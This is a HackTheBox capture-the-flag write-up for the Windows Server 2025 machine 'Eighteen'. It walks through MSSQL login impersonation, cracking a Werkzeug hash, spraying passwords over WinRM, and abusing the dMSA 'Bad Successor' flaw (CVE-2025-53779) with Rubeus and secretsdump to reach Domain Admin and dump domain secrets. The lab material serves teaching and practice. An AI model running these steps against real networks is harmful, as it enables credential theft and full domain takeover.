---
title: "Eighteen"
difficulty: Easy
os: Windows
points: 20
rating: 2.4
date: 2025-11-15
avatar: assets/htb/eighteen.png
tags: [windows-server-2025, assume-breach, mssql-impersonation, bad-successor, dmsa, cve-2025-53779, werkzeug-pbkdf2, winrm]
htb_url: https://app.hackthebox.com/machines/Eighteen
---

## Summary

Eighteen is a Windows Server 2025 assume-breach scenario that starts with valid MSSQL credentials. I use MSSQL login impersonation (`EXECUTE AS LOGIN`) to reach a `FinancePlanner` database where the web admin's password is stored as a Werkzeug PBKDF2-SHA256 hash. Cracking that hash gives me a password that sprays positively against another domain user holding WinRM rights. I escalate by abusing the "Bad Successor" vulnerability (CVE-2025-53779), a flaw in delegated Managed Service Account (dMSA) migration on Windows Server 2025 that lets me forge keys to impersonate Domain Admin.

## Enumeration

This is an assume-breach box, so I begin with credentials already in hand: `eighteen.htb\<user>:<pw>`, plus MSSQL access to `dc01.eighteen.htb:1433`. I connect to the SQL Server instance over Windows authentication.

```bash
impacket-mssqlclient eighteen.htb/<user>:'<pw>'@dc01.eighteen.htb -windows-auth
```

Once on the server, I enumerate the server principals and, more importantly, which logins I'm permitted to impersonate. Over-granted `IMPERSONATE` permissions are a routine finding post-foothold, so I always check `sys.server_permissions`.

```sql
SELECT name, type_desc FROM sys.server_principals;
SELECT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- -> sa, finance_app
```

## Foothold

With `finance_app` available as an impersonation target, I switch my login context and confirm the new identity.

```sql
EXECUTE AS LOGIN = 'finance_app';
SELECT SYSTEM_USER;
```

Now operating as `finance_app`, I switch to the `FinancePlanner` database and read the application's admin table, which stores the web admin's credential as a hash.

```sql
USE FinancePlanner;
SELECT username, password_hash FROM admins;
-- admin : pbkdf2:sha256:600000$<salt>$<hash>
```

The `pbkdf2:sha256:<iter>$<salt>$<hash>` literal prefix is the tell-tale sign of a Werkzeug hash, which hashcat handles with mode 10900.

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
# admin : <password>
```

Password reuse between the database and AD is the obvious pivot. I spray the cracked password across the domain users against WinRM and land a hit on a second user.

```bash
nxc winrm dc01.eighteen.htb -u users.txt -p '<password>' --continue-on-success
# Hit: eighteen.htb\<user2> : <password>
evil-winrm -i dc01.eighteen.htb -u <user2> -p '<password>'
```

## Privilege Escalation

Escalation abuses CVE-2025-53779, the "Bad Successor" flaw in the Windows Server 2025 dMSA (delegated MSA) migration flow. The logic flaw means an attacker with CreateChild rights on an OU (or specific ACLs over a dMSA object) can:

1. Create or modify a dMSA pointing to a privileged predecessor
2. Trigger a migration sequence that forges the new dMSA's keys based on the predecessor's identity
3. Have the KDC then issue TGTs honoring the predecessor's group memberships - including Domain Admins

I confirm my ACL position over the dMSA, drive the migration by setting `msDS-DelegatedMSAState`, and request a TGT for the dMSA, which inherits the predecessor's PAC.

```powershell
# Verify ACL position
Get-ACL "AD:CN=dmsa1,CN=Managed Service Accounts,DC=eighteen,DC=htb" | fl
# Trigger migration / set msDS-DelegatedMSAState
Set-ADComputer dmsa1 -Replace @{ "msDS-DelegatedMSAState" = 2 }
# Request TGT for the dMSA - inherits predecessor's PAC
Rubeus.exe asktgt /user:dmsa1$ /aes256:<key> /domain:eighteen.htb /dc:dc01.eighteen.htb /ptt
```

With a Domain Admin PAC in hand, I run DCSync to dump the domain's secrets.

```bash
impacket-secretsdump eighteen.htb/dmsa1\$@dc01.eighteen.htb -k -no-pass
```
